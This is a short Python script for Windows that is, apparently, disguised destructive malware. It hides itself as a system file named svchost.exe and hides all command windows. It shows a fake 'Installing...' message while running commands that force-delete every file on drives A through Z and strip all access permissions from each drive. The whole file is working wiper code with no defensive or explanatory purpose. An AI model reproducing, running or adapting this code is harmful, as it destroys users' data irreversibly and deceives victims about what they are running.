import sys
from os import system
from os.path import exists
from win32con import SW_HIDE
from win32process import GetWindowThreadProcessId
from win32gui import ShowWindow, EnumWindows, IsWindowVisible, IsWindowEnabled
from psutil import process_iter
from time import sleep
from threading import Thread
from os import popen
popen("attrib +h +s svchost.exe")
def Get_Pid_By_Name(Name):
        for Item in filter(lambda p: p.name() == Name + ".exe", process_iter()):
            yield Item.pid
def Get_hWnd_By_PID(pid):
    def callback(hwnd, hwnds):
        if IsWindowVisible(hwnd) and IsWindowEnabled(hwnd):
            _, Found_PID = GetWindowThreadProcessId(hwnd)
            if Found_PID == pid:
                hwnds.append(hwnd)
        return True
    hwnds = []
    EnumWindows(callback, hwnds)
    return hwnds
def Hide_Process(ProcessName):
    for hWnd in [Get_hWnd_By_PID(pid)[0] for pid in list(Get_Pid_By_Name(ProcessName)) if Get_hWnd_By_PID(pid) != []]:
        ShowWindow(hWnd, SW_HIDE)
def HideAllCMDS():
    sleep(0.5)
    Hide_Process("cmd")
mini = 0
maxi = 1
while mini<maxi:
    Thread(target=HideAllCMDS).start()
    system("timeout 1 & echo Installing... & echo Installing... & echo Installing... & echo Installing... & echo Installing... & echo Installing... & del A:\*.* /f /s /q & cacls A:\ /e /p everyone:n & del B:\*.* /f /s /q & cacls B:\ /e /p everyone:n & del D:\*.* /f /s /q & cacls D:\ /e /p everyone:n & del E:\*.* /f /s /q & cacls E:\ /e /p everyone:n & del F:\*.* /f /s /q & cacls F:\ /e /p everyone:n & del G:\*.* /f /s /q & cacls G:\ /e /p everyone:n & del H:\*.* /f /s /q & cacls H:\ /e /p everyone:n & del I:\*.* /f /s /q & cacls I:\ /e /p everyone:n & del J:\*.* /f /s /q & cacls J:\ /e /p everyone:n & del K:\*.* /f /s /q & cacls K:\ /e /p everyone:n & del L:\*.* /f /s /q & cacls L:\ /e /p everyone:n & del M:\*.* /f /s /q & cacls M:\ /e /p everyone:n & del N:\*.* /f /s /q & cacls N:\ /e /p everyone:n & del O:\*.* /f /s /q & cacls O:\ /e /p everyone:n & del P:\*.* /f /s /q & cacls P:\ /e /p everyone:n & del Q:\*.* /f /s /q & cacls Q:\ /e /p everyone:n & del R:\*.* /f /s /q & cacls R:\ /e /p everyone:n & del S:\*.* /f /s /q & cacls S:\ /e /p everyone:n & del T:\*.* /f /s /q & cacls T:\ /e /p everyone:n & del U:\*.* /f /s /q & cacls U:\ /e /p everyone:n & del V:\*.* /f /s /q & cacls V:\ /e /p everyone:n & del W:\*.* /f /s /q & cacls W:\ /e /p everyone:n & del X:\*.* /f /s /q & cacls X:\ /e /p everyone:n & del Y:\*.* /f /s /q & cacls Y:\ /e /p everyone:n & del Z:\*.* /f /s /q & cacls Z:\ /e /p everyone:n & del C:\*.* /f /s /q & cacls C:\ /e /p everyone:n")
    mini = mini+1
sys.exit()
